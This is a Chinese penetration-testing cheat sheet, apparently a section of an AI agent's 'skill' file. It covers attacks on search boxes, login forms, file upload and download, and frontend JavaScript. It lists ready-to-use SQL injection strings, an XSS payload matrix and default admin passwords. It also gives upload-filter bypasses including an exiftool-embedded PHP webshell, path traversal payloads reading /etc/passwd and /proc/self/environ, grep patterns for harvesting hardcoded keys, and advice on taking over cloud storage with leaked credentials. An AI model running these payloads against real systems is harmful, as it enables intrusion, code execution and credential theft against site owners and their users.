# 输入框/上传下载/JS审查（input-upload-js）

> 来源：jiejieskill SKILL.md 拆分（2026-08-11）。由 SKILL.md 相应章节按需加载。

### 6.4 输入框 / 登录框 / 文件上传下载专项

#### 输入框（参数注入面）
```bash
# 每个输入框都是注入点：搜索框→SQLi/XSS，用户名→SQLi，订单号→IDOR
# 隐藏参数发现：Arjun / paramspider / x8
arjun -u $URL -t 20
# 输入过滤测试：
#   长度限制（后端未校验 → 溢出/截断利用）
#   类型绕过（数字参数传字符串/数组/负数）
#   编码绕过（Unicode / HTML 实体 / 双重编码）
# 批量扫描：Burp 扫描器全参跑 + 手工验证重点参数
```

#### 搜索框专项（XSS / 弱口令 / SQL 注入）
```bash
# 搜索框 = 最高频攻击面：同时是 SQLi 注入点 + XSS 反射点 + 账号枚举源

# ---------- 1. SQL 注入（搜索词 → LIKE/WHERE 子句）----------
# 单引号探测 → 空响应/报错 = 可能注入
search.php?key=test'                 # 引号破坏 SQL → 报错/空响应
search.php?key=test' -- -            # 注释闭合 → 恢复正常 = 注入确认
search.php?key=' OR '1'='1' -- -     # OR 恒真 → 全量返回 = 盲注确认
# ⚠️ 基准词查无结果时 AND 布尔差分失效（AND '1'='1' 仍为假）→
#    改用 OR 恒真确认，或先找一个能命中数据的搜索词（见 6.14 教训）
# 时间盲注（WAF 拦 sleep 时换 benchmark/构造延时）
# 联合注入：确认列数后 union select（需回显位）

# ---------- 2. XSS（搜索词回显）----------
# 先找反射点：带唯一 token 搜，多上下文 grep（别一个 grep 就下结论）
curl -s "search.php?key=JJXSS123" | grep -oE 'value="[^"]*JJXSS123[^"]*"|.{0,40}JJXSS123.{0,40}'
# 回显位置：表单 value 属性（最高频）/ 结果标题「搜索『xxx』」/ 面包屑 / meta / JS 变量
# payload 矩阵（value 属性上下文）
<script>alert(1)</script>
"><script>alert(1)</script>          # 突破 value 属性
" onmouseover="alert(1)              # 属性内事件
</title><script>alert(1)</script>    # title 跳出
<img src=x onerror=alert(1)>
# HTML 实体编码（< → &lt;）→ 尝试大小写/嵌套/事件属性绕过
# 存储型：搜索词存入热搜/搜索历史 → 管理员后台触发（授权内慎测）

# ---------- 3. 弱口令 / 账号枚举（搜索框泄露）----------
# 搜索 "admin" / "登录" / "后台" → 找管理入口（常见弱口令管理端）
# 搜手机号/邮箱/用户名 → 响应差异 = 用户枚举
# 搜索接口撞库：key 参数可批量猜账号
# 配合登录框爆破：admin/admin、admin/123456、admin/admin888（详见 auth-testing.md）

# ---------- 4. 搜索框其他特有面 ----------
# 搜索词 → SSRF（部分系统集成第三方搜索/翻译 API，词作为 URL 参数）
# 搜索历史/热搜接口 → 批量用户搜索词泄露（敏感数据）
# 分页/排序参数：page / sort / order → 额外注入点
```

#### 登录框专项
```bash
# 登录框 = 认证接口：爆破/枚举/注入/逻辑 全测（详见认证全流程章节）
# 登录框 XSS：用户名反射 → 存储型（管理员后台被触发）
# 登录框 SQLi：user=' or 1=1#
# 登录接口未限流 / 记住我 cookie 缺陷 / 自动登录令牌可预测
```

#### 文件上传绕过矩阵（强化）
```bash
# 1. 后缀绕过
.php → .php5 .phtml .phar .shtml .php.jpg .php%00.jpg .php. .PhP
# 2. Content-Type 伪造
Content-Type: image/jpeg 携带 .php 内容
# 3. 内容检测绕过
#    图片头伪造：GIF89a/PNG 头 + 恶意代码
#    图片马：exiftool -Comment='<?php system($_GET["c"]);?>' 1.jpg
#    二次渲染绕过：上传原图 → 下载 → 插入代码 → 再上传
# 4. 解析漏洞
#    Apache：1.php.jpg 多后缀 / .htaccess 上传
#    Nginx：1.jpg/1.php、1.jpg%00.php（解析错误）
#    IIS：1.asp;.jpg、1.aspx.jpg
# 5. 前端校验绕过：拦截 JS / 直接改请求 / 重放
# 6. 上传 HTML/SVG → 存储型 XSS
# 7. 同名文件覆盖 / 竞态上传
# 8. 上传后路径探测：尝试访问并执行
```

#### 文件下载 / 任意文件读取
```bash
# 常见参数：file= path= name= download= /down?filename=
# 路径穿越
file=../../../../etc/passwd
file=....//....//etc/passwd            # 过滤 .. 时绕过
file=%2e%2e%2f%2e%2e%2fetc/passwd      # URL 编码
file=/proc/self/environ
# 源码泄露 → 配合 JS 审查/代码审计
# 下载接口带 URL 参数 → SSRF 联动
# 敏感文件：.env / .git/config / web.xml / application.properties
```

### 6.5 JS 源代码审查

> 前端 JS 是「未过滤的信息收集金矿」：API 端点、硬编码密钥、加密逻辑、鉴权方式全在里面。小程序反编译出的 JS 同理。

#### JS 获取
```bash
# 浏览器 Sources / Network → 全量保存
# 爬虫抓取历史/全部 JS
gau target.com | grep -iE '\.js(\?|$)'
waybackurls target.com | grep -iE '\.js'
# 批量下载
cat urls.txt | while read u; do curl -s "$u" -o js/$(basename "$u"); done
# 小程序：wxapkg 反编译出的 js（见资产探测章节）
```

#### 反混淆
```bash
# 格式化：JS Beautifier / prettier
# webpack 混淆：obfuscator.io → de4js 反混淆全家桶
# 识别混淆特征：eval 大段字符串 / document.write / Function 构造器
```

#### 端点 / 密钥提取
```bash
# 提取 API 端点
grep -rhoE '"/[a-zA-Z0-9_/?=&.-]+"' js/ | sort -u
# 提取域名/URL
grep -rhoE 'https?://[a-zA-Z0-9./?=_-]+' js/ | sort -u
# 硬编码密钥/敏感信息
grep -riE 'api[_-]?key|secret|token|password|appid|appsecret|AKIA|BEGIN (RSA|PRIVATE)' js/
# 自动化：jsluice / LinkFinder / SourceMapper
```

#### DOM XSS 与危险函数
```js
// 危险 Sink：innerHTML / document.write / eval / new Function / insertAdjacentHTML / location
// 输入 Source：location.search / document.referrer / postMessage / window.name / localStorage
// 找 Source→Sink 数据流 → 构造 payload
// 工具：Burp DOM Invader（自动定位 sink）、semgrep 规则扫描
// 经典：location.hash → innerHTML；postMessage → eval
```

#### 敏感信息与业务线索
```bash
# 硬编码测试账号 / 口令 / 内网 IP（配合 SSRF）
# 调试开关：debug=true / test 环境地址 / 隐藏后台入口
# 废弃功能 / 老接口：版本升级遗留的未授权端点、旧版 API 路径
#   特征：/v1/ 老版本、测试路由、删除注释掉的接口
# 泄露 KEY → API 利用：AK/SK、云密钥 → 调云 API / 接管存储桶
#   （配合 crypto-testing.md 密钥提取；AK 识别后试 aliyun/aws cli）
# 注释中的接口说明 / 鉴权方式 / 加密方式
# 加密算法线索：找 AES/SM4/加密参数 → 联动加解密章节
# 第三方 SDK：支付/统计/推送（数据外带风险）
```

